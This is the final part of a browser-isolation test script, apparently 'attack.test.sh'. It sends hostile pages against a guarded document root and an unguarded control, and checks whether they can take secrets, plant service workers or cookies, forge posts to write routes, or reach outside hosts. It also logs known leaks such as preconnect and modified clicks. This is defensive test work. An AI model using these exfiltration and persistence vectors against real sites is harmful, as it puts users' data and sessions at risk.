        eq("%d ways to %s, and none came back with the secret" % (ways, what), lambda: [len(tried("guarded", kind)), sorted(took("guarded", kind))], [ways, []])
    eq("a page reads its own folder's file, and is refused a service and a shared worker", lambda: [got("guarded", "token: its own file"), got("guarded", "plant: serviceworker") | got("guarded", "plant: sharedworker")], [{"200 OWN"}, {"refused SecurityError"}])
    for kind in ("svg", "xhtml"):
        tab = visit(b, URL["guarded"] + "/shots/evil." + kind)
        eq("the script of a directly opened %s does not run" % kind, lambda: [time.sleep(0.3), ran(b, tab)][1], False)
    tab = visit(b, LATER + "/other.html")
    eq("a page on another local origin cannot include a docroot script or image", lambda: tab.evaluate("take('%s')" % URL["guarded"]), ["error", 0, "error"])
    eq("21 ways of posting, and no post reached a write route", lambda: [len(tried("guarded", "post: ")), posted()], [21, []])
    eq("no row and no file was written", lambda: sorted(set(tree("guarded").items()) ^ set(before.items())), [])
    eq("the user approves a host for each kind of request", lambda: {approve(name + ".guarded.example") for name in HOSTED}, {200})
    attack(b, "guarded", HOSTILE, "hosted").wait(STOPPED, 3)
    until(lambda: set(HOSTED[:5]) <= set(secure["guarded"].hosts()))
    eq("an allowed host is asked for scripts, styles, images, fonts and media; connect, WebSocket, form, frame and navigation to it stay blocked",
       lambda: [time.sleep(0.5), len(tried("guarded", "hosted: ")), secure["guarded"].hosts()][1:], [len(HOSTED) - 1, sorted(HOSTED[:5])])

def residuals(b):
    """What is known to get out: measured, never failed on."""
    attack(b, "guarded", HOSTILE, "hints")
    time.sleep(1)
    print("NOTE: preconnect opened %d connections" % hinted.opened)
    print("NOTE: dns-prefetch opened %d connections; the lookup itself is not seen here" % looked.opened)
    print("NOTE: blocked navigations opened %d connections with no request" % sum(wire["guarded"].opened - len(wire["guarded"].requests()) for wire in (second, secure)))
    tab = attack(b, "guarded", HOSTILE, "click", True)
    f = tab.frame()
    for what, mods, button in (("ctrl+click", "Control", "left"), ("middle click", "", "middle"), ("alt+click", "Alt", "left"), ("shift+click", "Shift", "left")):
        was = len(clicked.requests())
        n = opened(b, lambda: (tab.click(*f.at("#link"), mods=mods, button=button), time.sleep(1)))
        print("NOTE: %s opened %d tabs, %d requests, on a link in a page that undid frame.js" % (what, n, len(clicked.requests()) - was))

def control(b):
    visit(b, framed("control", "/artifacts/victim.html")).evaluate(SECRETS)
    tab = attack(b, "control", HOSTILE, "loads,stores,plants,reads,posts")
    for kind, ways, what in WAYS:
        eq("control: each of the %d ways to %s comes back with the secret" % (ways, what), lambda: [len(tried("control", kind)), sorted(tried("control", kind) - took("control", kind))], [ways, []])
    eq("control: the page plants a cookie, a key, a database and a word around it", lambda: tab.evaluate(STATE)[1:5], [True, ["planted", "secret"], ["planted", "secret"], "1"])
    eq("control: and has a service and a shared worker", lambda: [got("control", "plant: serviceworker", HOSTILE), got("control", "plant: sharedworker", HOSTILE)], [{"true"}, {"undefined"}])
    arrives(*LOADED)
    until(lambda: "nested.html" in rows("decisions.jsonl", "board"))
    eq("control: six ways of posting arrive at each write route", lambda: [route for route in ("/_decision", "/_note", "/_allow") if Control.posts.count(route) < 6], [])
    eq("control: and write a pick, a note and an approval", lambda: [sorted(set(rows("decisions.jsonl", "board"))), set(rows("notes.jsonl", "text")), m.isolate.read_allow(ROOTS["control"])], [["forged.html", "nested.html"], {"SECRET note", "forged"}, ({HOSTILE: ["forged.example"]}, None)])
    for kind in ("self/", "top/"):
        for name in NAMES[kind]:
            visit(b, framed("control", "/%s?v=%s" % (HOSTILE, kind.replace("/", "-") + name)))
            arrives(kind + name)
    for name in NAMES["click/"]:
        tab = attack(b, "control", HOSTILE, "click")
        x, y = tab.evaluate("(() => { const f = document.querySelector('iframe'), a = f.getBoundingClientRect(), r = f.contentDocument.querySelector('#%s').getBoundingClientRect(); return [a.left + r.left + r.width / 2, a.top + r.top + r.height / 2]; })()" % name)
        eq("control: a plain click opens %s: %s" % ("no tab" if name == "top" else "a tab", name), lambda: opened(b, lambda: (tab.click(x, y), arrives("click/" + name)), 4 if name != "top" else 0), int(name != "top"))
    for kind in ("svg", "xhtml"):
        visit(b, framed("control", "/%s?v=doc-%s" % (HOLE, kind)))
        arrives(kind + "/self", *INSIDE[kind])
        tab = visit(b, URL["control"] + "/shots/evil." + kind)
        arrives(*INSIDE["direct-" + kind])
        eq("control: the script of a directly opened %s runs" % kind, lambda: ran(b, tab), True)
    tab = visit(b, LATER + "/other.html")
    eq("control: that page includes both", lambda: tab.evaluate("take('%s')" % URL["control"]), ["loaded", 1, "loaded"])
    attack(b, "control", HOSTILE, "hosted")
    eq("control: every kind of request reaches its host", lambda: [until(lambda: len(secure["control"].hosts()) == len(HOSTED)), secure["control"].hosts()][1], sorted(HOSTED))

URL = {}
for side in SIDES:
    docroot(side)
server = Server(ROOTS["guarded"])
server.start(first=KEPT)
try:
    URL.update(guarded=server.url, control=unguarded())
    LATER = unguarded()
    with browser_lib.browser(200) as b:
        for part in (guarded, residuals, control):
            try:
                part(b)
            except Exception as exc:
                print("%s: %s stopped: %r" % ("NOTE" if part is residuals else "FAIL", part.__name__, exc))
                bad.extend([] if part is residuals else [part.__name__])
finally:
    server.stop()
selves = [name for name in NAMES["self/"] if "self/" + name in second["control"].paths()]
eq("control: every self navigation reaches the second server", selves, NAMES["self/"])
print("control self navigations: %d of 6" % len(selves))
eq("control: every other vector does", sorted(PATHS - second["control"].paths()), [])
eq("no request reaches the second server from a guarded page", second["guarded"].requests(), [])
print("guarded requests: %d" % len(second["guarded"].requests()))
sys.exit(1 if bad else 0)
PY
[ "$rc" != 4 ] || [ "${DESIGN_KIT_REQUIRE_BROWSER:-}" = 1 ] || { echo "PASS attack.test.sh (no browser: nothing ran)"; exit 0; }
[ "$rc" = 0 ] || { echo "FAIL: attack.test.sh (exit $rc)"; exit 1; }
echo "PASS attack.test.sh"
